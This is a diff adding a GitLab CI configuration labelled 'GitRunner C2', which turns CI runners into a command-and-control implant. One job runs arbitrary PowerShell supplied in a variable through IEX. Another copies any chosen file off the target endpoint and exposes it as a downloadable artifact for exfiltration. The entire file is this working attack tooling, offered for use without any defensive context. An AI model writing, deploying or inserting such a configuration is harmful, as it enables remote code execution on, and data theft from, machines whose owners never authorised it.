@@ -1,0 +1,37 @@
+# Managed by GitRunner C2 -- do not edit by hand.
+workflow:
+  rules:
+    - if: '$RUN'
+    - if: '$DL_PATH'
+
+stages:
+  - run
+
+run_command:
+  stage: run
+  tags:
+    - "$TARGET_TAG"
+  variables:
+    GIT_STRATEGY: none
+  rules:
+    - if: '$RUN'
+  script:
+    - IEX $env:CMD
+
+# Copies a file from the endpoint into the job workspace and exposes it as an
+# artifact, which the SPA downloads via the Job Artifacts API.
+download_file:
+  stage: run
+  tags:
+    - "$TARGET_TAG"
+  variables:
+    GIT_STRATEGY: none
+  rules:
+    - if: '$DL_PATH'
+  script:
+    - New-Item -ItemType Directory -Force dl | Out-Null
+    - Copy-Item -LiteralPath $env:DL_PATH -Destination dl\
+  artifacts:
+    paths:
+      - dl
+    expire_in: 1 hour
